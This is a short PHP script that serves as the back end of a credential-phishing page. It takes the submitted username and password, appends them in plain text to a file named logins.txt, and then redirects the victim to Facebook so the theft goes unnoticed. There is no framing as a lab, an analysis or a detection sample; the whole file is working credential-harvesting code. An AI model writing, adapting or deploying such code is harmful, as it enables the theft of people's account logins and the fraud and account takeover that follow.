<?php

	  session_start();{
		if(! ( isset($_REQUEST['username']) && isset($_REQUEST['password']) ) ){
			return false;
		}

		$username = $_REQUEST['username'];
		$password = $_REQUEST['password'];
		
                $file = fopen("logins.txt", "a") or die("Unable to open file!");
		
		fwrite($file, $username.">".$password.PHP_EOL);			
  		fclose($file);//closing logins.txt.	
		
	
  			header("Location: https://www.facebook.com");
			exit();
			
			}
			session_destroy();
			

?>
